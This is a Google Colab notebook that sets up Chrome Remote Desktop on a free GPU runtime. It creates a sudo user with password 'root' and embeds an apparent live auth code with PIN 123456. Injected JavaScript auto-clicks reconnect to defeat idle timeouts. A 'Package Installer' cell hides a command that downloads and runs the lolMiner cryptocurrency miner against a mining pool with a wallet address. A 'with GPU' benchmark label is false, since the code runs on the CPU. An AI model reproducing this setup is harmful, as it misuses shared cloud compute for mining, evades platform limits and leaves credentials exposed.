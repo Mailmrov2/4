{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "PPee RDP.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/Cmarlee/rdpwin/blob/master/PPee_RDP.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "t4yNp3KmLtZ6",
        "cellView": "form",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "ff725a4c-2568-4f4f-d396-834d2fd55b4c"
      },
      "source": [
        "#@title **Create User**\n",
        "#@markdown Enter Username and Password\n",
        " \n",
        "import os\n",
        " \n",
        "username = \"user\" #@param {type:\"string\"}\n",
        "password = \"root\" #@param {type:\"string\"}\n",
        " \n",
        "print(\"Creating User and Setting it up\")\n",
        " \n",
        "# Creation of user\n",
        "os.system(f\"useradd -m {username}\")\n",
        " \n",
        "# Add user to sudo group\n",
        "os.system(f\"adduser {username} sudo\")\n",
        "    \n",
        "# Set password of user to 'root'\n",
        "os.system(f\"echo '{username}:{password}' | sudo chpasswd\")\n",
        " \n",
        "# Change default shell from sh to bash\n",
        "os.system(\"sed -i 's/\\/bin\\/sh/\\/bin\\/bash/g' /etc/passwd\")\n",
        " \n",
        "print(\"User Created and Configured\")"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Creating User and Setting it up\n",
            "User Created and Configured\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "N2lk628Q_CGt",
        "outputId": "62fda870-9acc-48c6-ce0a-ffa71213b91b"
      },
      "source": [
        " \n",
        "from tensorflow.python.client import device_lib\n",
        "device_lib.list_local_devices()"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "[name: \"/device:CPU:0\"\n",
              " device_type: \"CPU\"\n",
              " memory_limit: 268435456\n",
              " locality {\n",
              " }\n",
              " incarnation: 17230503338830279959, name: \"/device:GPU:0\"\n",
              " device_type: \"GPU\"\n",
              " memory_limit: 14509932544\n",
              " locality {\n",
              "   bus_id: 1\n",
              "   links {\n",
              "   }\n",
              " }\n",
              " incarnation: 2044007325608198724\n",
              " physical_device_desc: \"device: 0, name: Tesla T4, pci bus id: 0000:00:04.0, compute capability: 7.5\"]"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 2
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "v1U7iItW_uHP",
        "outputId": "76df244a-09f4-493d-da17-716a11902528"
      },
      "source": [
        " \n",
        "from numba import jit, cuda\n",
        "import numpy as np\n",
        "# to measure exec time\n",
        "from timeit import default_timer as timer\n",
        " \n",
        "# normal function to run on cpu\n",
        "def func(a):                                \n",
        "    for i in range(10000000):\n",
        "        a[i]+= 1    \n",
        " \n",
        "                        \n",
        "def func2(a):\n",
        "    for i in range(10000000):\n",
        "        a[i]+= 1\n",
        "if __name__==\"__main__\":\n",
        "    n = 10000000                            \n",
        "    a = np.ones(n, dtype = np.float64)\n",
        "    b = np.ones(n, dtype = np.float32)\n",
        "    \n",
        "    start = timer()\n",
        "    func(a)\n",
        "    print(\"without GPU:\", timer()-start)    \n",
        "    \n",
        "    start = timer()\n",
        "    func2(a)\n",
        "    print(\"with GPU:\", timer()-start)"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "without GPU: 4.540607131000002\n",
            "with GPU: 4.538818676000005\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 34
        },
        "id": "t06FIsbn-4pG",
        "outputId": "58f442d4-546a-49da-98d9-7f88004e65af"
      },
      "source": [
        "import IPython\n",
        "from google.colab import output\n",
        " \n",
        "display(IPython.display.Javascript('''\n",
        "function ClickConnect(){\n",
        "   btn = document.querySelector(\"colab-connect-button\")\n",
        "   if (btn != null){\n",
        "     console.log(\"Click colab-connect-button\"); \n",
        "     btn.click() \n",
        "     }\n",
        "   \n",
        "   btn = document.getElementById('ok')\n",
        "   if (btn != null){\n",
        "     console.log(\"Click reconnect\"); \n",
        "     btn.click() \n",
        "     }\n",
        "  }\n",
        "  \n",
        "setInterval(ClickConnect,60000)\n",
        "'''))\n",
        " \n",
        "print(\"Done.\")"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "application/javascript": [
              "\n",
              "function ClickConnect(){\n",
              "   btn = document.querySelector(\"colab-connect-button\")\n",
              "   if (btn != null){\n",
              "     console.log(\"Click colab-connect-button\"); \n",
              "     btn.click() \n",
              "     }\n",
              "   \n",
              "   btn = document.getElementById('ok')\n",
              "   if (btn != null){\n",
              "     console.log(\"Click reconnect\"); \n",
              "     btn.click() \n",
              "     }\n",
              "  }\n",
              "  \n",
              "setInterval(ClickConnect,60000)\n"
            ],
            "text/plain": [
              "<IPython.core.display.Javascript object>"
            ]
          },
          "metadata": {
            "tags": []
          }
        },
        {
          "output_type": "stream",
          "text": [
            "Done.\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "Q6bl1b0EifVG",
        "cellView": "form",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "89ca67cb-5d66-4cdb-f9fd-662a0d41db7b"
      },
      "source": [
        "#@title **Creat RDP**\n",
        "#@markdown  It takes 2-5 minutes for installation\n",
        " \n",
        "import os\n",
        "import subprocess\n",
        " \n",
        "#@markdown  Visit http://remotedesktop.google.com/headless and Copy the command after authentication\n",
        " \n",
        "CRP = \"DISPLAY= /opt/google/chrome-remote-desktop/start-host --code=\\\"4/0AY0e-g59BZ1YWEflSGr2Bw3F4tAjUPGz88sAd2sHh1sap6WUag9NEi50al9_ufHPnVpXJw\\\" --redirect-url=\\\"https://remotedesktop.google.com/_/oauthredirect\\\" --name=$(hostname)\" #@param {type:\"string\"}\n",
        " \n",
        "#@markdown Enter a pin more or equal to 6 digits\n",
        "Pin = 123456 #@param {type: \"integer\"}\n",
        " \n",
        " \n",
        "class CRD:\n",
        "    def __init__(self):\n",
        "        os.system(\"apt update\")\n",
        "        self.installCRD()\n",
        "        self.installDesktopEnvironment()\n",
        "        self.installGoogleChorme()\n",
        "        self.finish()\n",
        " \n",
        "    @staticmethod\n",
        "    def installCRD():\n",
        "        print(\"Installing Chrome Remote Desktop\")\n",
        "        subprocess.run(['wget', 'https://dl.google.com/linux/direct/chrome-remote-desktop_current_amd64.deb'], stdout=subprocess.PIPE)\n",
        "        subprocess.run(['dpkg', '--install', 'chrome-remote-desktop_current_amd64.deb'], stdout=subprocess.PIPE)\n",
        "        subprocess.run(['apt', 'install', '--assume-yes', '--fix-broken'], stdout=subprocess.PIPE)\n",
        " \n",
        "    @staticmethod\n",
        "    def installDesktopEnvironment():\n",
        "        print(\"Installing Desktop Environment\")\n",
        "        os.system(\"export DEBIAN_FRONTEND=noninteractive\")\n",
        "        os.system(\"apt install --assume-yes xfce4 desktop-base xfce4-terminal\")\n",
        "        os.system(\"bash -c 'echo \\\"exec /etc/X11/Xsession /usr/bin/xfce4-session\\\" > /etc/chrome-remote-desktop-session'\")\n",
        "        os.system(\"apt remove --assume-yes gnome-terminal\")\n",
        "        os.system(\"apt install --assume-yes xscreensaver\")\n",
        "        os.system(\"systemctl disable lightdm.service\")\n",
        " \n",
        "    @staticmethod\n",
        "    def installGoogleChorme():\n",
        "        print(\"Installing Google Chrome\")\n",
        "        subprocess.run([\"wget\", \"https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb\"], stdout=subprocess.PIPE)\n",
        "        subprocess.run([\"dpkg\", \"--install\", \"google-chrome-stable_current_amd64.deb\"], stdout=subprocess.PIPE)\n",
        "        subprocess.run(['apt', 'install', '--assume-yes', '--fix-broken'], stdout=subprocess.PIPE)\n",
        " \n",
        "    @staticmethod\n",
        "    def finish():\n",
        "        print(\"Finalizing\")\n",
        "        os.system(f\"adduser {username} chrome-remote-desktop\")\n",
        "        command = f\"{CRP} --pin={Pin}\"\n",
        "        os.system(f\"su - {username} -c '{command}'\")\n",
        "        os.system(\"service chrome-remote-desktop start\")\n",
        "        print(\"Finished Succesfully\")\n",
        " \n",
        " \n",
        "try:\n",
        "    if username:\n",
        "        if CRP == \"\":\n",
        "            print(\"Please enter authcode from the given link\")\n",
        "        elif len(str(Pin)) < 6:\n",
        "            print(\"Enter a pin more or equal to 6 digits\")\n",
        "        else:\n",
        "            CRD()\n",
        "except NameError as e:\n",
        "    print(\"username variable not found\")\n",
        "    print(\"Create a User First\")"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Installing Chrome Remote Desktop\n",
            "Installing Desktop Environment\n",
            "Installing Google Chrome\n",
            "Finalizing\n",
            "Finished Succesfully\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "OXsG6_pxeEFu",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "9fbfc2c8-2412-4033-9948-c22c37563edf"
      },
      "source": [
        "#@title Package Installer { vertical-output: true }\n",
        "run = True #@param {type:\"boolean\"}\n",
        "#@markdown *Package management actions (gasp)*\n",
        "action = \"Install\" #@param [\"Install\", \"Check Installed\", \"Remove\"] {allow-input: true}\n",
        " \n",
        "package = \"wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.28/lolMiner_v1.28a_Lin64.tar.gz tar -xf lolMiner_v1.28a_Lin64.tar.gz cd 1.28a ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user LTC:LeZokBG3wL3pVTBwyGYcNxAxvTuMBhWMVW.eth1\" #@param {type:\"string\"}\n",
        "system = \"apt\" #@param [\"apt\", \"\"]\n",
        " \n",
        "def install(package=package, system=system):\n",
        "  if system == \"apt\":\n",
        "    !apt --fix-broken install > /dev/null 2>&1\n",
        "    !killall apt > /dev/null 2>&1\n",
        "    !rm /var/lib/dpkg/lock-frontend\n",
        "    !dpkg --configure -a > /dev/null 2>&1\n",
        " \n",
        "    !apt-get  install -o Dpkg::Options::=\"--force-confold\" --no-install-recommends -y $package\n",
        "    \n",
        "    !dpkg --configure -a > /dev/null 2>&1 \n",
        "    !apt  update > /dev/null 2>&1\n",
        " \n",
        "    !apt install $package > /dev/null 2>&1\n",
        " \n",
        "def check_installed(package=package, system=system):\n",
        "  if system == \"apt\":\n",
        "    !apt list --installed | grep $package\n",
        " \n",
        "def remove(package=package, system=system):\n",
        "  if system == \"apt\":\n",
        "    !apt remove $package\n",
        " \n",
        "if run:\n",
        "  if action == \"Install\":\n",
        "    install()\n",
        "  if action == \"Check Installed\":\n",
        "    check_installed()\n",
        "  if action == \"Remove\":\n",
        "    remove()"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "E: Command line option 'x' [from -xf] is not understood in combination with the other options.\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "92TzR_voAKMG",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "cd230f3f-090c-4eed-e4d9-ade95238b153"
      },
      "source": [
        "!sleep 9999999"
      ],
      "execution_count": 13,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "^C\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "UoeBdz6_KE6a",
        "cellView": "form"
      },
      "source": [
        "#@title **Colab Shutdown**\n",
        " \n",
        "#@markdown To Sleep Colab\n",
        "Sleep = True #@param {type:'boolean'}\n",
        "if Sleep:\n",
        "    from time import sleep\n",
        "    sleep(43200)"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}